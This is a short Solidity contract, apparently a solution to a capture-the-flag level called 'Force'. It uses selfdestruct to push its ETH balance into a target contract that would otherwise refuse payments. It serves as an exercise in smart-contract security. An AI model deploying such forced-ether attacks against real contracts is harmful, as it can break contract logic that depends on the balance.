// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Soon-to-be-deprecated `selfdestruct` forcefully passes ETH to any address
        // Since this was deployed with a balance, simply selfdestruct and point to address
        selfdestruct(payable(contractAddress));
    }
}
